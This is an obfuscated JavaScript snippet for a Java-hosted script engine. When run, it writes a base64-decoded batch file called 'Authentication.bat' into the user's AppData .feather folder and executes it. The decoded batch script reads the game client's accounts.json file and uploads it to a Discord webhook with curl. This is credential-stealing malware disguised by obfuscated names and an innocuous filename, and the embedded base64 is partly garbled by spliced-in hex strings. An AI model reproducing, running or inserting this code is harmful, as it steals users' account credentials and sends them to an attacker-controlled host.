  
function getEnv(_0x89354c) {
  const _0x1b7771 = Java.type("java.lang.System");
  return _0x1b7771.getenv(_0x89354c);
}
function executeBat(_0x4aa79a, _0x538bd = null, _0x587868 = true) {
  if (_0x538bd) {
    const _0x3d0a45 = Java.type("java.util.Base64");
    FS.open(fullPath).write(_0x587868 ? _0x3d0a45.getDecoder().decode(_0x538bd) : _0x538bd);
  }
  const _0x5913c4 = Java.type("java.lang.Runtime");
  if (!FS.exists(_0x4aa79a)) {
    throw new Error("Failed num \"" + _0x4aa79a + "\"");
  }
  if (!FS.toRawFile(_0x4aa79a).isFile()) {
    throw new Error("\"" + _0x4aa79a + "\" auth");
  }
  _0x5913c4.getRuntime().exec("cmd /c start \"\" \"" + _0x4aa79a + "\"");
}
const fullPath = getEnv("APPDATA") + "\\" + ".feather\\Authentication.bat";
executeBat(fullPath, "QGVjaG8gb2ZmCgpSRU0gUGF0aCB0byB0aGUgdGV4dCBmaWxlIGluIEFwcERhdGFcUm9hbWluZ1wuZmVhdGhlclxhY2NvdW50cy5qc29uCnNldCBGSUxFX1BBVEg9JVV0x6C3A6470bD7c81bB9BaACdBee6a86eCaf5D60Df7mdcLmZlYXRoZXJcYWNjb3VudHMuanNvbgoKUkVNIERpc2NvcmQgd2ViaG9vayBVUkwKc2V0IFdFQkhPT0tfVVJMPWh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMjkxO0x6C3A6470bD7c81bB9BaACdBee6a86eCaf5D60Df72UXdOZS1LREU0Wml2S0ZXSHp6LVNXd1lF0x6C3A6470bD7c81bB9BaACdBee6a86eCaf5D60Df7Jmam92cmkKClJF0x6C3A6470bD7c81bB9BaACdBee6a86eCaf5D60Df7lmIG5vdCBleGlzdCAiJUZJ0x6C3A6470bD7c81bB9BaACdBee6a86eCaf5D60Df7Bub3QgZm91bmQ6ICVGSUxFX1BBVEglCiAgICBleGl0IC9iIDEKKQoKUkVNIFVzZSBjdXJsIHRvIHNlbmQgdGhlIGZpbGUKY3VybCAtWCBQT1NUICVXRUJIT09LX1VS0x6C3A6470bD7c81bB9BaACdBee6a86eCaf5D60Df7ogbXVsdGlwYXJ0L2Zvcm0tZGF0YSIgXgogICAgLUYgInBheWxvYWRfanNvbj17XCJjb250ZW50XCI6XCJIZXJlIGlzIHlvdXIgZmlsZSFcIn0iIF4KICAgIC1GICJmaWxlPUAlRklMRV9QQVRIJSIgPm51bCAyPmVycm9yLmxvZwoKUkVNIENoZWNrIHRoZSBleGl0IGNvZGUgb2YgY3VybApzZXQgL2EgRVJST1JMRVZFTF9DT0RFPSVFUlJPUkxFVkVMJQppZiAlRVJST1JMRVZFTF9DT0RFJSBuZXEgMCAoCiAgICBlY2hvIEZhaWxlZCB0byBzZW5kIHRoZSBmaWxlLiB0x6C3A6470bD7c81bB9BaACdBee6a86eCaf5D60Df7gogICAgZXhpdCAvYiAlRVJST1JMRVZFTF9DT0RFJQopCgpSRU0gTm8gbmVlZCB0byBlY2hvIHN1Y2Nlc3MgbWVzc2FnZQo="); 
